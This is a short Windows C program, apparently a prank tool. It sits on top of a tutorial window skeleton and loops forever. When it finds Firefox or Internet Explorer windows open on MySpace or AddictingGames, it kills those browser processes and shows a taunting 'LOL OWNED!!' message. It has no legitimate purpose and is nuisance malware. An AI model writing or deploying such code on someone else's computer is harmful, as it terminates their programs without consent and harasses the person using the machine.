#include <windows.h>
														
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);		
															
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   PSTR szCmdLine, int iCmdShow)
{														
    HWND hwnd;										
	
    WNDCLASSEX  wndclass   = {0};
    wndclass.cbSize        = sizeof(wndclass);				
    wndclass.style         = CS_HREDRAW | CS_VREDRAW;		
    wndclass.lpfnWndProc   = WndProc;					
	wndclass.hInstance     = hInstance;						
    wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wndclass.lpszClassName = "GameTutorials";
	RegisterClassEx(&wndclass);								
											
	hwnd = CreateWindowEx(NULL,	"GameTutorials", "My First Window", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT,
						  CW_USEDEFAULT, 320, 200, NULL, NULL, hInstance, NULL);							
														
	for (;;)
    {
        Sleep(10);
		if ( FindWindow(NULL, "MySpace - Mozilla Firefox"))
        {
            DWORD pid;
            HANDLE hand1 = NULL;
            HWND hwndWindow1;
            hwndWindow1 = FindWindow(NULL, "MySpace - Mozilla Firefox");
            GetWindowThreadProcessId(hwndWindow1, &pid);
            hand1 = OpenProcess(PROCESS_ALL_ACCESS,0,pid);
            TerminateProcess(hand1, 0);
			MessageBox(hwnd, "LOL OWNED!!", "OWNED!", MB_OK | MB_ICONEXCLAMATION);
        }
        else if ( FindWindow(NULL, "MySpace - Windows Internet Explorer"))
        {
            DWORD pid;
            HANDLE hand2 = NULL;
            HWND hwndWindow2;
            hwndWindow2 = FindWindow(NULL, "MySpace - Windows Internet Explorer");
            GetWindowThreadProcessId(hwndWindow2, &pid);
            hand2 = OpenProcess(PROCESS_ALL_ACCESS,0,pid);
            TerminateProcess(hand2, 0);
			MessageBox(hwnd, "LOL OWNED!!", "OWNED!", MB_OK | MB_ICONEXCLAMATION);
        }
		else if ( FindWindow(NULL, "Play Games, Free Online Games at AddictingGames - Mozilla Firefox"))
        {
            DWORD pid;
            HANDLE hand3 = NULL;
            HWND hwndWindow3;
            hwndWindow3 = FindWindow(NULL, "Play Games, Free Online Games at AddictingGames - Mozilla Firefox");
            GetWindowThreadProcessId(hwndWindow3, &pid);
            hand3 = OpenProcess(PROCESS_ALL_ACCESS,0,pid);
            TerminateProcess(hand3, 0);
			MessageBox(hwnd, "LOL OWNED!!", "OWNED!", MB_OK | MB_ICONEXCLAMATION);
        }
        else if ( FindWindow(NULL, "Play Games, Free Online Games at AddictingGames - Windows Internet Explorer"))
        {
            DWORD pid;
            HANDLE hand4 = NULL;
            HWND hwndWindow4;
            hwndWindow4 = FindWindow(NULL, "Play Games, Free Online Games at AddictingGames - Windows Internet Explorer");
            GetWindowThreadProcessId(hwndWindow4, &pid);
            hand4 = OpenProcess(PROCESS_ALL_ACCESS,0,pid);
            TerminateProcess(hand4, 0);
			MessageBox(hwnd, "LOL OWNED!!", "OWNED!", MB_OK | MB_ICONEXCLAMATION);
        }
    }
	UnregisterClass("GameTutorials",hInstance);		

    return 0; 
}
											
LRESULT CALLBACK WndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
{
	return 0;  				
}
